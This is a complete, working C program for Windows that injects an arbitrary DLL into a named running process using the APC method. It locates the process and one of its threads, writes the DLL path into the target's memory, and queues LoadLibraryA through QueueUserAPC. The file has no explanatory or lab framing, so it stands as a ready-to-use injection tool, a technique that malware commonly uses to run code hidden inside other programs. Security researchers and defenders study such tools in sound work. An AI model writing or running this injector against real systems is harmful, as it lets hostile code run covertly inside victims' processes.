#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdbool.h>

// Helper function to find the process ID by name
DWORD FindProcessId(const char* processName) {
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("Failed to create process snapshot. Error: %lu\n", GetLastError());
        return 0;
    }

    DWORD processId = 0;
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return processId;
}

// Helper function to find a suitable thread in the target process
HANDLE FindOpenThread(DWORD pid) {
    THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        printf("Failed to create thread snapshot. Error: %lu\n", GetLastError());
        return NULL;
    }

    HANDLE hThread = NULL;
    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                // Try to open the thread with minimum required access rights
                hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                if (hThread) {
                    break;  // Successfully found a thread we can use
                }
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }

    CloseHandle(hThreadSnap);
    return hThread;
}

bool InjectDLL(HANDLE hProcess, HANDLE hThread, const char* dllPath) {
    SIZE_T pathLen = strlen(dllPath) + 1;
    
    // Allocate memory in the target process
    void* pRemoteMemory = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMemory) {
        printf("Failed to allocate memory in target process. Error: %lu\n", GetLastError());
        return false;
    }

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, pathLen, NULL)) {
        printf("Failed to write memory in target process. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        return false;
    }

    // Get LoadLibraryA address
    FARPROC loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr) {
        printf("Failed to get address of LoadLibraryA.\n");
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        return false;
    }

    // Queue the APC
    if (QueueUserAPC((PAPCFUNC)loadLibraryAddr, hThread, (ULONG_PTR)pRemoteMemory) == 0) {
        printf("Failed to queue APC. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        return false;
    }

    return true;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <process_name> <dll_path>\n", argv[0]);
        return 1;
    }

    const char* processName = argv[1];
    const char* dllPath = argv[2];

    // Verify DLL file exists
    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("DLL file not found: %s\n", dllPath);
        return 1;
    }

    // Find the target process ID
    DWORD targetPID = FindProcessId(processName);
    if (targetPID == 0) {
        printf("Failed to find process: %s\n", processName);
        return 1;
    }

    // Open the target process first
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPID);
    if (!hProcess) {
        printf("Failed to open target process. Error: %lu\n", GetLastError());
        return 1;
    }

    // Find and open a thread in the target process
    HANDLE hThread = NULL;
    int retryCount = 0;
    const int MAX_RETRIES = 5;
    
    do {
        hThread = FindOpenThread(targetPID);
        if (hThread) break;
        
        Sleep(100);
        retryCount++;
        printf("Retrying to find thread (%d/%d)...\n", retryCount, MAX_RETRIES);
    } while (retryCount < MAX_RETRIES);

    if (!hThread) {
        printf("Failed to find suitable thread after %d attempts\n", retryCount);
        CloseHandle(hProcess);
        return 1;
    }

    // Perform the injection
    bool success = InjectDLL(hProcess, hThread, dllPath);

    // Clean up
    CloseHandle(hThread);
    CloseHandle(hProcess);

    if (!success) {
        return 1;
    }

    printf("APC queued successfully. DLL injection initiated.\n");
    return 0;
}